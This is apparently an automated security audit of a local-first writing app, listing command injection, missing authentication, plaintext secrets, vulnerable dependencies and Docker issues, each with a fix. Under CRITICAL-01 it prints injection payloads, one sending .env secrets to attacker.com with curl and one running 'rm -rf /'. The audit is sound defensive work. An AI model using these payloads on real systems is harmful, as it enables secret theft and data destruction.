# Security Audit — Annie (Word Coach)

**Date:** 2026-03-15
**Auditor:** Polecat furiosa (automated security review)
**Scope:** Full codebase — auth, input validation, secrets, dependencies, Docker, MCP

---

## Executive Summary

Annie is designed as a **local-first, single-user application** with no authentication by design. This is explicitly documented in `docs/memory-bank/decisionLog.md`. The findings below should be interpreted in that context — many are acceptable for localhost use but become critical if the app is exposed to a network (e.g., via the Cloudflare tunnel in `docker-compose.yml`).

**Key concern:** The `docker-compose.yml` includes a Cloudflare tunnel service, which means this app *is* designed to be network-accessible. Combined with zero authentication, this makes several findings genuinely critical.

---

## Findings

### CRITICAL-01: Command Injection in Snapshot System

**Severity:** CRITICAL
**Files:**
- `src/mcp/snapshot.ts:71,74` — `message` parameter
- `src/mcp/snapshot.ts:92` — `limit` parameter
- `src/mcp/snapshot.ts:113-114` — `commitHash` parameter

**Description:** The snapshot module passes user-controlled input directly into `execSync()` shell commands with inadequate or no sanitization.

**Command injection vectors:**

1. **`createSnapshot(message)`** (lines 71, 74): The `message` parameter is interpolated into a git commit command with only double-quote escaping (`message.replace(/"/g, '\\"')`). This does not prevent injection via backticks, `$(...)`, or newlines.
   ```
   Payload: `$(curl attacker.com/steal?key=$(cat .env))`
   Result: execSync('git commit -m "$(curl attacker.com/steal?key=$(cat .env))"')
   ```

2. **`restoreSnapshot(commitHash)`** (lines 113-114): The `commitHash` parameter has zero sanitization and is passed directly to `git cat-file -t ${commitHash}` and `git checkout ${commitHash}`.
   ```
   Payload: ; rm -rf /
   Result: execSync('git cat-file -t ; rm -rf /')
   ```

3. **`listSnapshots(limit)`** (line 92): The `limit` parameter is interpolated into `git log -n ${limit}` with no validation that it's actually a number.

**Exposure:** These functions are callable via the MCP endpoint (`POST /api/mcp`) with no authentication. Tools: `snapshot_database`, `restore_snapshot`, `list_snapshots`.

**Recommended fix:** Use `execFileSync` (array-based, no shell) instead of `execSync` with string interpolation. Validate `commitHash` against `/^[a-f0-9]+$/`, validate `limit` as a positive integer, and use `--` to separate git flags from arguments.

---

### CRITICAL-02: No Authentication on Any API Endpoint

**Severity:** CRITICAL (when network-accessible via Cloudflare tunnel)
**Files:** All 30+ route files in `src/app/api/`

**Description:** Zero authentication or authorization on any endpoint. All API routes are publicly accessible. This is by design for local use, but the presence of a Cloudflare tunnel in `docker-compose.yml` means the app can be exposed to the internet.

**Impact when tunneled:**
- Anyone can read all projects, scenes, and story content
- Anyone can delete projects and data
- Anyone can invoke MCP tools including `restore_snapshot` (database rollback)
- Anyone can read/write AI settings including API keys
- Anyone can trigger Google OAuth flows

**Recommended fix:** Add authentication middleware (even a simple shared secret/bearer token) that gates all `/api/*` routes when `NODE_ENV=production` or when a tunnel is configured.

---

### CRITICAL-03: API Key Readable via Unauthenticated Endpoint

**Severity:** CRITICAL (when network-accessible)
**File:** `src/app/api/ai-settings/route.ts:14,37`

**Description:** The `PUT /api/ai-settings` endpoint accepts a plaintext API key in the request body and stores it unencrypted in SQLite. The `GET` endpoint returns a masked version, but the actual key is stored in plaintext in the database file, which is also accessible via the snapshot system (git commits of the `.db` file).

**Additional risk:** `PUT` has no auth — an attacker could overwrite the API key with their own, redirecting AI requests to a malicious endpoint via `baseUrl`.

**Recommended fix:** Encrypt API keys at rest. Add authentication to the settings endpoint.

---

### HIGH-01: OAuth Tokens Stored Unencrypted in SQLite

**Severity:** HIGH
**File:** `src/lib/controllers/google-auth.ts:33-39`

**Description:** Google OAuth access and refresh tokens are stored in plaintext in the `GoogleCredential` table. The database file is also versioned via git snapshots, meaning tokens persist in git history even after revocation.

**Recommended fix:** Encrypt tokens at rest using a key derived from a user-provided secret or system keychain.

---

### HIGH-02: MCP Endpoint Exposes 70+ Destructive Tools Without Access Control

**Severity:** HIGH
**Files:**
- `src/app/api/mcp/route.ts:4-18`
- `src/mcp/index.ts` (entire file, 900+ lines)

**Description:** The MCP endpoint at `POST /api/mcp` instantiates a fresh MCP server per request (stateless, no session tracking) and exposes all 70+ tools including:
- `delete_node`, `delete_story_object`, `delete_relationship` — data deletion
- `restore_snapshot` — database rollback (+ command injection per CRITICAL-01)
- `write_scene_content` — arbitrary content modification
- `google_auth_connect` — initiate OAuth flows
- `export_to_google_docs` — exfiltrate content to attacker's Google account if OAuth is configured

**Recommended fix:** Add authentication to the MCP endpoint. Consider a tool allowlist for unauthenticated access.

---

### HIGH-03: npm Audit — 6 Known Vulnerabilities (5 High, 1 Moderate)

**Severity:** HIGH
**File:** `package.json` / `package-lock.json`

| Package | Severity | Issue | Advisory |
|---------|----------|-------|----------|
| `@hono/node-server` <1.19.10 | High | Auth bypass via encoded slashes in static paths | GHSA-wc8c-qw6v-h7f6 |
| `hono` ≤4.12.6 | High | 5 issues: timing attack, cookie injection, SSE injection, file access, prototype pollution | Multiple |
| `express-rate-limit` 8.2.0-8.2.1 | High | IPv4-mapped IPv6 bypass | GHSA-46wh-pxpv-q5gq |
| `minimatch` 9.0.0-9.0.6 | High | 3 ReDoS vulnerabilities | Multiple |
| `rollup` 4.0.0-4.58.0 | High | Arbitrary file write via path traversal | GHSA-mw96-cpmx-2vgc |
| `ajv` 7.0.0-alpha.0-8.17.1 | Moderate | ReDoS with `$data` option | GHSA-2g4f-4pwh-qvx6 |

**Recommended fix:** Run `npm audit fix`. The audit reports all are fixable.

---

### MEDIUM-01: Docker Container Runs as Root

**Severity:** MEDIUM
**File:** `Dockerfile:22-42`

**Description:** The production runtime stage has no `USER` directive, so the Node.js process runs as root inside the container. If an attacker achieves code execution (e.g., via CRITICAL-01), they have root privileges in the container.

**Recommended fix:** Add a non-root user:
```dockerfile
RUN addgroup --system --gid 1001 nodejs && adduser --system --uid 1001 nextjs
USER nextjs
```

---

### MEDIUM-02: No Security Headers (CSP, HSTS, X-Frame-Options)

**Severity:** MEDIUM
**File:** `next.config.ts:1-7`

**Description:** No security headers are configured. No Content-Security-Policy, no X-Frame-Options (clickjacking risk), no X-Content-Type-Options, no Strict-Transport-Security.

**Recommended fix:** Add security headers via `next.config.ts` `headers()` function or middleware.

---

### MEDIUM-03: Error Message Information Disclosure

**Severity:** MEDIUM
**Files:**
- `src/app/api/universes/route.ts:9`
- `src/app/api/world-objects/[id]/route.ts`
- `src/app/api/relationships/[id]/route.ts`

**Description:** Some routes expose raw error messages in responses (`error.message` or `String(error)`), which can leak database schema details, file paths, or internal state. Other routes correctly return generic "Internal server error" messages.

**Recommended fix:** Standardize error handling across all routes to return generic error messages in production.

---

### MEDIUM-04: No CORS Configuration

**Severity:** MEDIUM
**File:** `next.config.ts`

**Description:** No explicit CORS configuration. While Next.js defaults to same-origin for API routes, the lack of explicit CORS headers means any origin could potentially interact with the API when accessed through the Cloudflare tunnel (browser same-origin policy varies by setup).

**Recommended fix:** Add explicit CORS headers restricting to known origins.

---

### MEDIUM-05: Hardcoded Git User Identity in Snapshot System

**Severity:** MEDIUM
**File:** `src/mcp/snapshot.ts:45-46,53-54`

**Description:** The snapshot system hardcodes `user.name "Alex"` and `user.email "alexsiri7@gmail.com"` in git config. This is a minor information leak and makes attribution meaningless in multi-user scenarios.

**Recommended fix:** Use a generic identity like "Word Coach Annie" or make it configurable.

---

### LOW-01: parseInt Without Bounds Checking

**Severity:** LOW
**Files:** Multiple API routes (e.g., `src/app/api/projects/route.ts:7-8`)

**Description:** Query parameters parsed with `parseInt()` have no bounds validation. Negative values, very large numbers, or NaN results are passed directly to Prisma queries. Prisma handles these safely, but it's poor practice.

**Recommended fix:** Clamp values: `Math.max(0, Math.min(parseInt(val) || 20, 100))`.

---

### LOW-02: Cloudflare Tunnel Token in Environment

**Severity:** LOW
**File:** `docker-compose.yml:20`

**Description:** `CLOUDFLARE_TUNNEL_TOKEN` is passed via environment variable interpolation from the host's `.env.local`. This is standard practice but the token appears in `docker inspect` output and container process listing.

**Recommended fix:** Use Docker secrets or a secrets manager for production deployments.

---

### LOW-03: openssl Installed in All Docker Stages

**Severity:** LOW
**File:** `Dockerfile:4,13,25`

**Description:** `openssl` is installed in all 3 build stages. It's only needed for Prisma in the runtime stage. The deps and builder stages don't need it, increasing attack surface.

**Recommended fix:** Only install `openssl` in the runner stage.

---

## Summary Table

| ID | Severity | Category | Summary |
|----|----------|----------|---------|
| CRITICAL-01 | CRITICAL | Input Validation | Command injection in snapshot system via execSync |
| CRITICAL-02 | CRITICAL | Auth | No authentication on any endpoint (tunneled to internet) |
| CRITICAL-03 | CRITICAL | Secrets | API key readable/writable via unauthenticated endpoint |
| HIGH-01 | HIGH | Secrets | OAuth tokens stored unencrypted in SQLite |
| HIGH-02 | HIGH | Auth/MCP | 70+ destructive MCP tools with no access control |
| HIGH-03 | HIGH | Dependencies | 6 known vulnerabilities (5 high severity) |
| MEDIUM-01 | MEDIUM | Docker | Container runs as root |
| MEDIUM-02 | MEDIUM | Headers | No security headers (CSP, HSTS, X-Frame-Options) |
| MEDIUM-03 | MEDIUM | Info Leak | Error messages expose internal details |
| MEDIUM-04 | MEDIUM | CORS | No CORS configuration |
| MEDIUM-05 | MEDIUM | Info Leak | Hardcoded git identity in snapshots |
| LOW-01 | LOW | Validation | parseInt without bounds checking |
| LOW-02 | LOW | Secrets | Tunnel token in docker environment |
| LOW-03 | LOW | Docker | Unnecessary packages in build stages |

---

## Methodology

- Manual code review of all 30+ API route handlers
- Review of MCP server implementation (70+ tools)
- Analysis of database access patterns (Prisma ORM)
- Docker configuration review (Dockerfile, docker-compose)
- Dependency audit (`npm audit`)
- Secrets and credential management review
- Security header analysis
